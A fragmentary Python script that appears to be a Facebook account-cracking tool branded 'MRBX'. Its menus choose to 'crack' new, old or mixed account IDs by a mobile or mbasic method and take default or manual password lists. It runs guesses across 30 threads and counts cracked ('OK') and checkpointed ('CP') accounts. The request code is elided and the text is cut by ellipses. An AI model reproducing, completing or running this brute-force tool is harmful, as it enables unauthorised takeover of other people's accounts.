...
def setting():
	os.system('clear')
	banner()
	print('\n[\033[1;97m\033[1;41m  Choose Id Type   \033[0m\033[1;93m]\n')
	print('[1] CRACK NEW')
	print('[2] CRACK OLD')
	print('[3] CRACK MIX')
	...
	print('[2] Mbasic')
	print(54*"_")
	hc = input('[ MRBX ] Input Your Choose : ')
	if hc in ['1','01']:
	...
	banner()
	print('\n\x1b[1;30m%s[%sMRBX%s]%s-----%s[%sMRBX%s] \n'%(H,P,H,P,H,P,H,))
	print('\n[\033[1;97m\033[1;41m  User Difult Passward Inter (d)   \033[0m\033[1;93m]\n')
	print('\n\x1b[1;30m%s[%sMRBX%s]%s-----%s[%sMRBX%s] \n'%(H,P,H,P,H,P,H,))
	pwplus=input('Use Password Manual/depault( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print('\n\x1b[1;30m%s[%sMRBX%s]%s-----%s[%sMRBX%s] '%(H,P,H,P,H,P,H,))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print('[{h}{u}]{h} OK : {h}%s '%(ok))
	print('{k}[{k}{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}[MRBX]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}ok - {ok}{P}]-{P}[{k}cp - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
